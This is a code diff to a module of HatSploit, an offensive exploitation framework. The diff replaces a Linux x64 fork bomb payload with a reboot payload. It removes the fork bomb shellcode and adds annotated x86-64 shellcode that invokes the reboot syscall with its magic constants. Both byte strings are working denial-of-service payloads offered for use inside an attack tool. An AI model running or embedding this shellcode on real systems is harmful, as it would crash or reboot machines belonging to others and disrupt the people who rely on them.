@@ -31,12 +31,12 @@ from utils.payload.payload import PayloadGenerator
 class HatSploitPayload(Payload, PayloadGenerator):
     details = {
         'Category': "stager",
-        'Name': "Linux x64 Fork Bomb",
-        'Payload': "linux/x64/fork_bomb",
+        'Name': "Linux x64 Reboot",
+        'Payload': "linux/x64/reboot",
         'Authors': [
             'Ivan Nikolsky (enty8080)'
         ],
-        'Description': "Fork bomb payload for Linux x64.",
+        'Description': "Reboot payload for Linux x64.",
         'Dependencies': [
             ''
         ],
@@ -67,7 +67,11 @@ class HatSploitPayload(Payload, PayloadGenerator):
 
         self.output_process("Generating shellcode...")
         shellcode = (
-            b"\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\xeb\xf5"
+            b"\xba\xdc\xfe\x21\x43"  # mov    $0x4321fedc,%edx
+            b"\xbe\x69\x19\x12\x28"  # mov    $0x28121969,%esi
+            b"\xbf\xad\xde\xe1\xfe"  # mov    $0xfee1dead,%edi
+            b"\xb0\xa9"              # mov    $0xa9,%al
+            b"\x0f\x05"              # syscall
         )
 
         self.output_process("Generating payload...")
